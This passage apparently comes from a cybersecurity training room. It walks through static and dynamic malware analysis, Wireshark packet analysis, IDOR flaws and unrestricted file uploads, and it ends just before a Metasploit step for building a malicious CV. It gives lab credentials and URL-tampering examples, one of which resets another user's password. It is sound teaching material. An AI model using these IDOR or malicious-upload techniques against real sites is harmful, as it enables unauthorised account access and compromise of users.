-   Always assume that malware samples will infect your device; hence executing it is not always the first and only step in analysing it.
-   Only run the malware sample in a controlled environment that prevents potential compromise of unwanted assets.
-   It is always recommended to have your **sandbox,** which allows you have a worry-free execution of malware samples.

A **sandbox** is a controlled test environment that mimics a legitimate end-user working environment. It gives analysts a safe environment to execute malware samples and learn their behaviour. Lastly, having a ready sandbox prevents analysts from running malware samples in their workstations, which is highly dangerous and impractical for the possibility of unwanted impact.

In a typical setup, sandboxes also provide automated analysis at the disposal of Security Analysts to determine if a binary from a set of malware samples requires further manual investigation.  

For this task, you may start the attached FlareVM instance by clicking on the Start Machine button. This VM will serve as your **sandbox**. However, do not expect this machine to provide an automated analysis since we will assist Forensic McBlue in conducting manual analysis. 

Note: If the VM is not visible, use the blue Show Split View button at the top-right of the page.

You may use the following credentials for alternative access via Remote Desktop (RDP):

Machine IP: `MACHINE_IP`

User: `administrator`

Pass: `letmein123!`

Static and Dynamic Analysis

We have understood the prerequisites needed to handle the malware safely from the previous section. Now, let's have a quick refresher on the two methods of malware analysis.

**Static Analysis** is a way of analysing a malware sample without executing the code. This method mainly focuses on profiling the binary with its readable information, such as its properties, program flow and strings. Given the limitation of not executing it, sometimes this method gives insufficient information, which is why we resort to Dynamic Analysis.   

Meanwhile, **Dynamic Analysis** mainly focuses on understanding the malware by executing it in a safe environment, such as a Sandbox. By doing this, you will see the malware live in action, its exact behaviour, and how it infects the environment.

Profiling Executables through Static Analysis

As discussed above, before popping the malware sample in `$Desktop\Malware Sample` directory, let's conduct a Static Analysis for the **mysterygift** binary.

![Malware sample.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/c445e08db1b099ba9a4b0034163ebb2b.png)﻿

For this exercise, we will mainly use the following tools: **Detect It Easy** and **CAPA**.

**Detect It Easy**

Right-click the sample and execute **Detect It Easy (DIE)**. This tool provides information about the file, such as its architecture, significant headers, packer used, and strings. In this task, we will only utilise the basic functionalities of Detect It Easy to gain the basic information needed to analyse the binary. If you want to learn more about this tool, you may refer to this [link](https://github.com/horsicq/Detect-It-Easy).

![Detect It Easy.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/18a26e0f910ee4e94f1310d7448d2349.png)  

Upon opening, we will immediately discover the binary's architecture, and the executable packer used.

Packing malware is a common technique used by malware developers to compress, obfuscate or encrypt the binary. With this, contents such as significant strings and headers will not be immediately visible to Static Analysis Tools.  

You may test this information by doing the following:

-   View the strings from Detect It Easy, which shows an overwhelming number of strings that are not that significant for investigation.
-   Note: Strings are pieces of text inside a binary, often containing information such as IP addresses, URLs, or file names used by the malicious program.  

![Detect it Easy (2).](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/2f1640cd8c821c7daf8ae9e04502b85a.png)  

-   Run **CAPA,** which shows that the binary mostly hides its logic and analysis is affected due to a packer.

**CAPA**

﻿**CAPA** detects capabilities in executable files. May it be for the installation of a service, invocation of network connections, registry modifications and such.

To start playing with CAPA, fire up the command prompt located in the taskbar and navigate to the Malware Sample directory, as shown below.

![CMD Taskbar.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/59ef6c9293acb4444b4f0a3583e7ff19.png)

```

﻿Given the CAPA output, we have discovered that the malware sample is packed. You may have also seen previously from **Detect It Easy** that the binary is packed by UPX.

![Detect It Easy packer result.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/0f07a743b05d98d28e32c6c2700659c8.png)

So now, let's unpack the binary using UPX and re-analyse the binaries using CAPA.

cmd.exe

```shell-session

```

cmd.exe

```shell-session
C:\Users\Administrator\Desktop\Malware Sample>del mysterygift.viv
C:\Users\Administrator\Desktop\Malware Sample>capa mysterygift
```

﻿You may observe that CAPA now has provided important information about the malware sample.

Note: We have executed `del mysterygift.viv` to delete the cached results of the first CAPA execution. By deleting the viv file, CAPA re-analyses the binary with accurate results.

With prior, yet limited, knowledge about the malware sample, let's investigate more by doing a dynamic analysis!

Deep-dive into Dynamic Malware Analysis  

You may have observed that we cannot execute the binary after double-clicking it, as its file extension is not `.exe`.

Before renaming and executing the binary, let's prepare the tool we need for analysing its behaviour - ProcMon. ProcMon, or Process Monitor, is a Windows tool that shows real-time registry, file system, and process/thread activity. You can learn more about it [here](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon). You may access it via the taskbar beside cmd.exe.  

![Taskbar tools.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/b2b60dc0253ce37a52ee519cd7a8d63e.png)  

Once opened, you will be prompted by  **Process Monitor Filter -**  a feature that allows us to filter the results logged by ProcMon. In this case, we want to only focus on events generated by `mysterygift.exe` process. Let's set the condition `Process Name - is - mysterygift.exe` ; add the filter and choose **OK** to close the prompt. 

![ProcMon Filters.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/ba3d3ff4ebdb70b61d9f46f7efc081c2.png)  

Now, let's prepare the malware sample for execution and rename it to **mysterygift.exe**.

cmd.exe

```shell-session
C:\Users\Administrator\Desktop\Malware Sample>mv mysterygift mysterygift.exe
```

We are now ready to pop the malware. Navigate to the Malware Sample folder, double-click the binary and observe the results generated by **ProcMon**. It might be overwhelming at first but let's utilise its functionalities to only show the information we want.

ProcMon has a panel that can filter the following, as highlighted in the image below (in sequence):

-   Show Registry Activity
-   Show File System Activity
-   Show Network Activity
-   Show Process and Thread Activity
-   Show Profiling Events

![ProcMon Filter Panel.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/795f4e9571af1fae9d4bb742ad13c8a5.png)  

With these filters, we will focus on the first three; Registry, File System and Network. As discussed above, malware tends to do the following; **Registry Modification, File Modification and Network Connections**. Let's start investigating them one by one.

**Registry Modification**

First, we want to determine if any significant Registry Modifications are executed by the binary, which is one of the expected behaviours introduced in this task.

To do this, unclick all filters and only choose **Show Registry Activity**. The results still give several results so let's add a filter by finding all Registry Key Creations and Modifications. Remove the following Operations by right-clicking an entry from the Operation column and choosing **Exclude '<operation (e.g. RegQueryKey)>'** similar to the image below:

-   RegOpenKey
-   RegQueryValue
-   RegQueryKey
-   RegCloseKey

![Exclude Filter.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/868f1b11f87c2cf30aa7c924e3010538.png)  

The view from ProcMon should yield fewer results, similar to the image below.

![ProcMon Registry Filter.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/eab9899da0795bfcd16a7b6d76950b5f.png)  

You may observe that only one Registry Key has both **RegCreateKey** and **RegSetValue**. This key is related to a persistence technique called **Registry Run Key Modification** and is commonly used by malware developers to install a backdoor. 

File Modification

Now, let's also determine if the malware sample executes File Creations. It may indicate that the malware drops prerequisite files for its successful execution.

Unclick all filters and choose the second filter - **Show File System Activity**. Again, the results are still numerous so let's add extra filters by focusing only on **File Write** events. Remove the following Operations again by right-clicking an entry from the Operation column and choosing Exclude '<operation (e.g. CreateFile)>':

-   CreateFile
-   CreateFileMapping
-   QuerySecurityFile
-   QueryNameInformationFile
-   QueryBasicInformationFile
-   CloseFile
-   ReadFile

The view from ProcMon should yield fewer results, similar to the image below.

![ProcMon File System Filter.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/26d9eb0b4bdaa5427e22c62b4c8b375f.png)  

You may observe that two files are written under the **C:\Users\Administrator** directory. The first file is located in the user's **TEMP** directory, which is commonly used by malware to drop another file for its disposal. The other file is written in the **STARTUP** directory, also used for persistence via **Startup Folders**.  

**Network Connections**

Lastly, let's confirm if the malware sample attempts to make a network connection. It may indicate that the malware communicates with external resources to download or establish remote access.

Unclick all filters and choose the third filter - Show Network Activity. Unlike the previous filters, the results are few and can be easily interpreted.

![ProcMon Network Filter.](https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5df70ef1f352bd85ed8120b3b72b0bf4.png)  

Please take note of these domains, as we can use this information to investigate the rabbit hole further.

Conclusion  

We have covered several topics on this task about Malware Analysis. For a quick summary, we have learned the following:

-   Key behaviours of malware aid in having an overview of what to expect in examining malware samples. 
-   The precautions needed to consider while handling malware samples and the importance of sandboxes.
-   Conduct a Static Analysis and profile the nature of the binary without executing it. 
-   Perform a manual Dynamic Analysis and observe the interactions of the malware sample in the **Registry**, **File System** and **Network**.

### [Day 13] Packet Analysis Simply having a wonderful pcap time

                         The Story  

![AoC Day 13](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/1893fdf9cd7a4530786f64fa5dad0825.png)  

Check out SecurityNinja's video walkthrough for Day 13 [here](https://www.youtube.com/watch?v=rSyR8YFbOlI)!  

After receiving the phishing email on Day 6 and investigating malware on Day 12, it seemed everything was ready to go back to normal. However, monitoring systems started to show suspicious traffic patterns just before closing the case. Now Santa's SOC team needs help in analysing these suspicious network patterns.  

Learning Objectives

-   Learn what traffic analysis is and why it still matters.
-   Learn the fundamentals of traffic analysis.
-   Learn the essential Wireshark features used in case investigation.
-   Learn how to assess the patterns and identify anomalies on the network.
-   Learn to use additional tools to identify malicious addresses and conduct further analysis.
-   Help the Elf team investigate suspicious traffic patterns.

Packets and Packet Analysis?

Packets are the most basic unit of the network data transferred over the network. When a message is sent from one host to another, it is transmitted in small chunks; each called a packet. Packet analysis is the process of extracting, assessing and identifying network patterns such as connections, shares, commands and other network activities, like logins, and system failures, from the prerecorded traffic files. 

Why Does Packet Analysis Still Matter?

Network traffic is a pure and rich data source. A Packet Capture (PCAP) of network events provides a rich data source for analysis. Capturing live data can be focused on traffic flow, which only provides statistics on the network traffic. On the other hand, identifying and investigating network patterns in-depth is done at the packet level. Consequently, threat detection and real-time performance troubleshooting cannot be done without packet analysis.

Today, most network-based detection mechanisms and notification systems ingest and parse packet-level information to create alerts and statistical data. Also, most red/blue/purple teaming exercises are optimised with packet-level analysis. Lastly, even encoded/encrypted network data still provides value by pointing to an odd, weird, or unexpected pattern or situation, highlighting that packet analysis still matters.

Points to consider when working with PCAPs

There are various points to consider before conducting packet analysis. The essential points are listed below.

**Point**

**Details**

Network and standard protocols knowledge.  

Knowledge of the network and protocol operations is a must. An analyst must know how the protocols work and which protocol provides particular information that needs to be used for analysis. Also, knowing the "normal" and "abnormal" behaviours and patterns is a big plus!   

Familiarity with attack and defence concepts.  

You can't detect what you don't know. An analyst must know "how the attacks are conducted" to identify "what is happening" and decide "where to look".  

**Practical experience in analysis tools.**

You can't burn down the haystack to find a needle! An analyst must know how to use the tools to extract particular information from packet bytes.

When the time comes to do "packet level analysis", it might sound hard to implement the theory in practice. But creating "checklists" and "mini playbooks" will make the analysis process considerably easier. A simple process checklist for practical packet analysis is shown below.   

**Required Check**

**Details**

Hypothesis  

Having a hypothesis is important before starting packets.

The analyst should know what to look for before starting an analysis. 

Packet Statistics  

Viewing the packet statistics can show the analyst the weight of the traffic in the capture file.  
It helps analysts see the big picture in terms of protocols, endpoints and conversations.   

Known Services  

The services used in everyday operations like web browsing, file sharing and mailing are called known services.  
The analyst should know which protocol is associated with which service.  
Sometimes adversaries use the known services for their benefit, so it is important to know what "the normal" looks like. **Note:** Service is a capability/application that facilitates network operations between users and applications. The protocol is a set of rules that identify the data processing and transmission over the network. 

Unknown Services  

Unknown services are potential red flags.  
The analyst should know how to research unknown protocols and services and quickly use them for the sake of the analysis.  

Known patterns   

Known patterns represent the analyst's knowledge and experience.  
The analyst should know the most common and recent case patterns to successfully detect the anomalies at first glance.  

**Environment**

The analyst has to know the nature and dynamics of the working environment. This includes IP address blocks, hostname and username structure, used services, external resources, maintenance schedules, and average traffic load.

You will need a tool to record, view and investigate the packets. There are a couple of tools that help users investigate traffic and packet captures. In this task, we will use Wireshark.

What is Wireshark and How to Use It?

Wireshark is an industry-standard tool for network protocol analysis and is essential in any traffic and packet investigation. You can view, save and break down the network traffic with it. You can learn more about Wireshark by completing the [**Wireshark module**](https://tryhackme.com/module/wireshark).

A quick tool demonstration for fundamental analysis is shown below. Now click on the **Start Machine** button at the top of the task to launch the **Virtual Machine**. The machine will start in a split-screen view. In case the VM is not visible, use the blue Show Split View button at the top-right of the page.

After starting the given VM, open the Wireshark and go through the walkthrough below. Once you double-click the PCAP file, it will load up in the tool. Alternatively, you can open the tool, drag and drop the file, or use the **"File"** menu. 

![Wireshark file open](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/305ec782315c682aefeabf1de52d5c71.png)  

After opening a pcap file for the first time, it might look daunting to decide where to focus. Breaking down all the packets in a tree-based view will make the analysis easier. Statistics will show the overall usage of the ports and services, so it will be slightly easier to see the big picture in the capture file.

-   Use the "Statistics --> Protocol Hierarchy" menu to view the overall usage of the ports and services.

Now, look at the output. The majority of the traffic is on TCP and HTTP: 

![Wireshark protocol hierarchy](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/691c28c05b1602462c5350e0f9a61cc4.png)

You can also view the connections by IP and TCP/UDP protocols to view the overall usage of the ports and services (including the total packet numbers transferred over a particular port and between two hosts). The next step is viewing the IP conversations to spot if there is a weird/suspicious/not usual IP address in use.  

-   Close the protocol hierarchy window, use the "Statistics --> Conversations" section and navigate to the IPv4 section to view the list of IP conversations. 

**Note:** Navigate to the TCP/UDP sections to view the TCP/UDP conversation details.

![Wireshark conversations](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/889fa7ef773feb93dc4f6925cc46eb1b.png)

Now we have a detailed list of the IP addresses, port numbers, and the number of packets transferred from one endpoint to another. This information will help us identify suspicious IP addresses, connections and ports. Analyse the details carefully; we may discover the IP addresses and services used by the Bandit Yeti APT!  

Let's analyse the findings in this section; navigate to the TCP part and look at the results, the port 80 is used as a communication medium in TCP. Port 80 represents the HTTP service. Next, you can view that DNS service is also used by navigating to the UDP section. Now we have two target protocols to analyse. Before continuing on specific protocol analysis, you should have completed the following checks and answered some analysis questions.

![Detective Elf](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/aae52a7dddfb2baf5c042bab7ef48422.png)

-   **Checks to do**

-   Packet statistics
-   Service identification
-   IP reputation check

-   **Questions to answer**

-   Which IP addresses are in use?
-   Has a suspicious IP address been detected?
-   Has suspicious port usage been detected?
-   Which port numbers and services are in use?
-   Is there an abnormal level of traffic on any port or service?  
    

Note: You can use the OSINT tools mentioned on Day 6 to conduct a reputation check on suspicious IP/domain addresses. Note that you can't rely on the reputation check if nothing suspicious is detected at this stage. You still need to go further to discover potential anomalies. Also, if you can't recall or identify the port numbers and service names, you can use the "Google Dorks" search techniques shown on Day 3 to search and learn port numbers and service names.  

After viewing the conversations, we collected the following information.

-   Source and destination IP addresses
-   Protocols
-   Port numbers
-   Services

Now let's focus on the HTTP and DNS. As a nature of these protocols, everything transferred over these protocols is cleartext. At this stage, filtering the DNS packets to view the interacted domains is a good start before deep diving into cleartext data.

-   Close the statistics window, and type `DNS` in the search bar to apply a filter and view the DNS packets.

DNS packets will help us to identify connected domain addresses to decide if they are affiliated with the suspicious threat and Bandit Yeti APT! Click on the first packet and use the lower left section of the tool (Packet Details Pane) to view the packet details. There are multiple collapsed sections; click on the `Domain Name System` section to expand and view the DNS details of the packets. There are additional collapsed sections under the corresponding section; expand them to view all available details. You will find the interacted domain under the `queries` section. See the below example and continue the analysis by analysing all available DNS packets.

![Wireshark dns filter](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/fcd28b2747d0c620201d923443e553f4.png)

Before continuing on HTTP analysis, ensure you have completed the following checks and answered the analysis questions.  

-   Checks to do

-   DNS queries
-   DNS answers

-   Questions to answer

-   Which domain addresses are communicated?
-   Do the communicated domain addresses contain unusual or suspicious destinations? 
-   Do the DNS queries look unusual, suspicious or malformed?

We discovered the connected domain addresses, and now we are one step closer to identifying if these patterns are part of the adversarial actions of the Bandit Yeti APT. You should notice the obvious anomalous sign in the domain address at this stage! Let's filter the HTTP packets to view the traffic details and understand what happened!  

-   Use the `HTTP` filter to filter and view the HTTP packets.

Click on the first packet and view the details. In HTTP, the **"GET Request"** is used by the client to send a request to a server. Usually, this request ends up with receiving data/resources. Therefore, we will look at these requests to see if any endpoint is asked for a resource from other servers over the HTTP protocol. 

Apply the filter and expand the `Hypertext Transfer Protocol` section. Expand the subsections as well and focus on the GET requests. You will find the requested resource paths under the `Full Request URI` section. Also, you can evaluate the `user-agent` section to check if there is anomalous or non-standard user-agent info. See the below example and continue on analysis by analysing all available HTTP packets.

![Wireshark http filter](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/cc58cfbbd1ef429365c806c3746ae94c.png)  

Before continuing to the next steps, ensure you have completed the following checks and answered the analysis questions.

-   Checks to do

-   HTTP GET requests
-   Requested URIs
-   HTTP requests host addresses
-   Used user-agents

-   Questions to answer

-   Which addresses are communicated?
-   Is there any resource share event between addresses?
-   If there is a file share event, which addresses hosts which files?
-   Do the user-agent fields look unusual, suspicious or malformed?  
    

Here, you should identify the stealthy connections of the Bandit Yeti APT. It looks like the adversarial group chose to use the daily used services and create less noise over the common protocols to avoid being detected.  
  
The investigation case doesn't contain any obvious anomaly patterns like scanning, brute force and exploitation. However, it contains suspicious connections and file shares. These two are red flags and require in-depth analysis. Still, there are a few steps more before concluding the case and elevating it to upper-level analysts. In sum, we detected two unidentified domain addresses, one highly associated with the Bandit Yeti APT. Also, we have already identified the IP addresses, port numbers and domain addresses. The next step is focusing on file shares. Let's extract the shared files and conduct fundamental checks on the files before finishing the analysis.

-   Use the "File --> Export Object --> HTTP" menu to extract files shared over the HTTP.

Look at the results. There are two files shared over the HTTP. Use the `Save All` option and save them on the desktop. Now close/minimise the Wireshark GUI and open a terminal window on the desktop. Use the `sha256sum` and `VirusTotal` tools shown on Day 6 to calculate the file hash value and to conduct hash-based file reputation analysis. 

![Wireshark export objects](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/9cfd2f36bcc8a9b5883a2853d027614f.png)

Before concluding the analysis, ensure you have completed the following checks and answered the analysis questions.  

-   Checks to do

-   Shared files
-   File hashes (SHA256)
-   Hash reputation check

-   Questions to answer

-   What are shared files?
-   Does the hash reputation marked as suspicious or malicious?
-   Which domain hosts the suspicious/malicious file?

After completing the demonstrated steps, we verified that one shared file was malicious. Before concluding the analysis, you need to correlate the findings and recall which address was hosting the malicious file.

After finishing all the shown steps and completing the required checks, you are finished with the fundamental packet analysis process of the given case. The following steps are creating a report of your findings and escalating the sample to the upper-level analysts, who will conduct a more in-depth analysis.![Bandit Yeti APT](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/1a2c4c3e1b40bc65cec5b68d5c8d3176.png)  

Your report should include the following information you collected in this task.

-   Suspicious IP addresses associated with Bandit Yeti APT
-   Suspicious domain addresses associated with Bandit Yeti APT
-   Connection with suspicious addresses
-   Requested URIs
-   Used user-agents
-   Shared file names, extensions and hashes
-   Server names hosted the shared files

This was the initial analysis process of a PCAP file. An in-depth analysis will create detection rules to strengthen the implemented defences and block these activities in the future. Now it is time to put what we've learned into practice. Answer the given questions to help Santa's SOC team analyse the suspicious traffic patterns to identify the Bandit Yeti's network traces on Santa's network.

### [Day 14] Web Applications I'm dreaming of secure web apps

                       The Story

![Task banner for day 14](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/283b841385da7500306091a326abee6e.png)

Check out Phillip Wylie's video walkthrough for Day 14 [here](https://www.youtube.com/watch?v=UlvYi7ae0G8)!

Elf McSkidy was sipping her coffee when she saw on her calendar that it was time to review the web application’s security. An internal web application is being developed to be used internally and manage the cyber security team. She calls Elf Exploit McRed and asks him to check the in-development web application for common vulnerabilities. Elf Exploit McRed discovers that the local web application suffers from an Insecure Direct Object References (IDOR) vulnerability.

## Learning Objectives

-   Web Applications
-   The Open Web Application Security Project (OWASP) Top 10
-   IDOR

## Web Application

A web application is a piece of software that we can use via a web browser. Unlike computer programs and smartphone applications, a web application does not require any installation on the user’s system to make use of it. To use a web application, we only need a web browser, such as Firefox, MS Edge, Google Chrome, or Safari.

There are many advantages for the user. Because it only needs a web browser, a user can access a web application from a Microsoft Windows system, a Mac computer, or a Linux system. If the user can use a modern web browser, they can access the web application. They will be able to see the same interface and enjoy a very similar experience even with different systems. They can even access the same web application from a web browser on their smartphones, and their experience would only be affected by the screen size and what it can hold.

Moreover, there are many advantages for the software developer. Instead of developing an application for macOS, another for MS Windows, and a third for ChromeOS, they only need to build one web application and ensure that it is compatible with the different modern browsers.

The following are some examples of popular web applications:

-   **Webmail:** Examples include Tutanota, ProtonMail, StartMail, and Gmail.
-   **Online Shopping:** Some examples are Etsy, Amazon, eBay, and AliExpress.
-   **Online Banking:** Modern banks increasingly allow clients to carry out their banking operations from a web browser.
-   **Online Office Suite:** Consider, for instance, Microsoft Office 365, Zoho Office, and Google Drive.

As web technologies advance, the number and types of web applications keep increasing.

### Database

When discussing web applications, it is essential to mention database systems. Many web applications need to access vast amounts of data. Even the most basic online shopping web application requires saving information about available products, customer details, and purchases. We must find a solution to hold such information and to read from and write to the existing data efficiently. The answer lies in using a database system.

There are two popular database models:

-   Relational Database: It stores the data in tables. Tables can share information. Consider the basic example with three tables: `products`, `customer_details`, and `purchases`. The `purchases` table would use information from the `products` table.
-   Non-Relational Database: It is any database that does not use tables. It might store the data in documents, and graph nodes, among other types.

Generally speaking, a web application needs to constantly query the database, for example, to search for information, add new records, or update existing ones.

## Access Control

Consider the case where you are using an online shop as a customer. After logging in successfully, you should be able to browse the available products and check products’ details and prices, among other things. Depending on the online shop, you might be able to add a question or a review about the product; however, as a customer, you should not be able to change the price or details. That’s due to access control.

Access control is a security element that determines who can access certain information and resources. After authentication (covered in Day 5), access control enforces the appropriate access level. In the online shopping example, a vendor should be able to update the prices or descriptions of their products. However, they should not be able to modify the information related to other vendors. A customer, on the other hand, should be able to view but should not be able to alter the data.

However, due to various programming or design mistakes, access control is sometimes not appropriately imposed.

## Web Application Vulnerabilities

The OWASP was established to improve software security. The [OWASP Top 10](https://owasp.org/Top10/) list aims to raise awareness regarding common security issues that plague web applications. This list would help software developers avoid common mistakes to build more secure products. Other users, such as penetration testers and bug bounty hunters, can use this list to serve their purposes.

IDOR refers to the situation where a user can manipulate the input to bypass authorization due to poor access control. IDOR was the fourth on the OWASP Top 10 list in 2013 before it was published under Broken Access Control in 2017. To learn more about IDOR, consider the following examples.

Let’s say that a user of ID `132` is directed to the following URL after logging in to the system: `http://santagift.shop/account/user_id=132`. However, they soon discover that they can browse other users’ profiles by changing the `user_id` value from `132` to other values expected to match existing user IDs. Although the system should deny them access to the new URL due to lack of authorization, an IDOR vulnerability will let the user display such unauthorized pages. In the figure below, the user managed to access the user’s account page with ID `101`.

![Figure showing IDOR vulnerability by changing the user ID in the URL](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/25e3d597ebf6fad017293948506ba0d5.png)  

Consider the example where requesting an invoice generates a link similar to this: `http://santagift.shop/invoices?download=115`. To test for vulnerabilities, one would replace `115` with another number, as shown in the image below. The system is vulnerable if it lets them access other users’ invoices.

![Figure showing IDOR vulnerability by changing the download file ID in the URL](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/2fc139b18d3c20c61a4b406de1c6f5f6.png)  

The impact of an IDOR vulnerability might let you reset the password of another user. For instance, after logging in, a malicious user might start with the URL to change their password and replace their username with that of another user. For example, the attacker would replace their username `yeti` in the URL `http://santagift.shop/account/changepassword=yeti` with another valid username and attempt to change their password, as shown in the figure below. The impact of an IDOR vulnerability can be high.

![Figure showing IDOR vulnerability to reset a user's password by by changing the username in the URL](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/d395d2dee1ed1a747508ba1206ac195d.png)  

## Exploiting an IDOR Vulnerability

To start the AttackBox and the attached Virtual Machine (VM), click on the “Start the AttackBox” button and click on the “Start Machine” button. Please give it a couple of minutes so that you can follow along.

On the AttackBox, start the Firefox Browser and open the URL `http://MACHINE_IP:8080`. This link should show you a login page. McSkidy has provided us with the following credentials to test the web application:

-   Username: `mcskidy`
-   Password: `devtest`

After doing some tests, Elf Exploit McRed was able to find multiple IDOR vulnerabilities. After logging in, a user can access the profile pages of other users. Moreover, files can be accessed by guessing their sequential number.

Answer the questions below

What is the office number of Elf Pivot McRed?

After logging in, try to change the number 101 in the URL to access the profile pages of other users.

Input Validation

Insufficient input validation is one of the biggest security concerns for web applications. The issue occurs when user-provided input is inherently trusted by the application. Since user input can also be controlled by an attacker, we can see how this inherent trust can lead to many problems. Several web application vulnerabilities, such as SQL Injection, Cross Site Scripting, and Unrestricted File Upload, stem from the issue of insufficient user input validation. This task will focus on how insufficient input validation can lead to an Unrestricted File Upload vulnerability.

Learning Objectives

-   Input validation of file upload funtionality
-   Unrestricted file upload vulnerabilities
-   Phishing through file uploads 

When emails are sent to a target(s) purporting to be from a trusted entity to lure individuals into providing sensitive information.

-   How to properly secure file upload functionality


The _Unrestricted_ in Unrestricted File Uploads

The ability to upload files to a server has become integral to how we interact with web applications. Just think of file uploads like a profile picture for a social media website, a report being uploaded to cloud storage, or saving a project on GitHub; the applications for file upload features are limitless.  
  
Unfortunately, when poorly handled, file uploads can also open up severe vulnerabilities in the server. This can lead to anything from relatively minor nuisance problems; all the way up to full Remote Code Execution (RCE) if an attacker manages to upload and execute a shell. With unrestricted upload access to a server (and the ability to retrieve data at will), an attacker could deface or otherwise alter existing content -- up to and including injecting malicious webpages, which lead to further vulnerabilities such as Cross-Site Scripting (XSS) or Cross-Site Request Forgery (CSRF). By uploading arbitrary files, an attacker could potentially use the server to host and/or serve illegal content or to leak sensitive information. Realistically speaking, an attacker with the ability to upload a file of their choice to your server -- with no restrictions -- is very dangerous indeed.

Unrestricted File Uploads usually have two main exploitation paths:

-   If the attacker can retrieve the uploaded file, it could lead to code execution if the attacker uploads a file such as a web shell.
-   If the file is viewed by a user, think of a CV application, then an attacker could embed malware in the uploaded file that would execute on the user's workstation once they view the file.

There has been quite a lot of focus on RCE through web shells in previous rooms, so in this task, we will focus on the latter exploitation path.  

Santa is Looking for a Sidekick

![elf](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/60b72d9b64550b86f7cae2509c147c2e.png)Santa is looking to hire new staff for his security team and has hired a freelance developer to create a web application where potential candidates can upload their CVs. Elf McSkidy is aware that third-party risks can be serious and has tasked you, Exploit McRed, with testing this application before it goes live. Since the festivities are right around the corner, we will have to focus on the core feature of the website, namely the ability to upload a CV.

Elf McSkidy has provided you with the latest version of the application. Start the machine attached to this task to load the website. Once loaded (roughly 2 minutes), you can navigate to [http://MACHINE_IP/](http://machine_ip/) to view the website, using either the AttackBox or your TryHackMe VPN connection:

![SantaSideKickWebsite](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6df11bf124fbe4180521bd48ea154b44.png)  

As we can see, the website allows us to upload our CVs to apply for a job in Santa's security team. Before we start the actual testing, let's first try to use the website as intended to get a better understanding of what is happening. Using your favourite word editor, create a simple new PDF and upload it to the application. Once uploaded, we can see the following message:

![SantaSideKickWebsite](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/0254d6c92580a77c2676fcf0aca66645.png)  

Interesting! The message also tells us that there will be human (or elf, more specifically) interaction with the file. This calls for further investigation!

Let's see what happens when we try to upload something other than a PDF, like an executable. You can rename the file extension of your CV to EXE:

![SantaSideKickWebsite](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/36d7f7c40c35070b084f637070deb147.png)  

That seems to work! It seems like the freelance developer has attempted to implement some security controls to prevent naughty elves. However, not all controls were implemented. But can we actually do something with this that will be malicious?  

Why the fuss over the Web Root?

So why would the developer take care to store the file outside the web root? Web servers are fairly simple things. You request a resource and the web server then responds with the resource. The magic happens when a request resource has a specific file type. Since this is a .NET application, the following resource types would be considered special:

-   ASP
-   ASPX
-   CSHTML

When a resource is requested with one of these file types, the web server will first execute some instructions found in these pages before sending the compiled response back to the user. Here is an example of an ASPX instruction that would be executed by the server:

```aspx
<form id="Form1" method="post" runat="server" EncType="multipart/form-data" action="Upload.aspx">
```

This tells the server that the HTML element first requires some formatting before being added to the HTML in the response, as can be seen by the`runat="server"` directive.

If we could upload any file that we wanted, we could upload one of these special types of pages, like an ASPX webshell. If this file was stored in the web root, we could request the file from the server, forcing the server to execute the code within our file before sending the response. It would be possible to get remote code execution on the web server. However, as the file is stored outside of the web root, we cannot make a request that would retrieve our uploaded file for execution. However, this protection is not sufficient for two main reasons:

-   Other vulnerabilities, such as local file inclusion, may exist that allow us to force the web server itself to recover the file that was stored outside the web root. If the web server recovers the file, the code within the file will again be executed, allowing for RCE.
-   While we cannot perhaps get RCE using this vulnerability, we know with certainty that actual users would interact with the files that we upload. Rather than targeting the web server directly, we could target the users that would interact with these files. If we were to upload a file that had malware embedded, it would execute when the user interacted with the file, still allowing us to breach Santa's perimeter!  
    

Shell from Santa  

Let's try to target one of Santa's elves that would be reviewing the uploaded CVs. In most cases, we would have to be quite creative with the malware that we upload, especially since this is for an application to a security role! This will require us to create a CV with a malicious macro embedded. However, since we are on Santa's red team and this is a security assessment, we only need to show proof of concept. Let's use Metasploit to generate a malicious CV:  

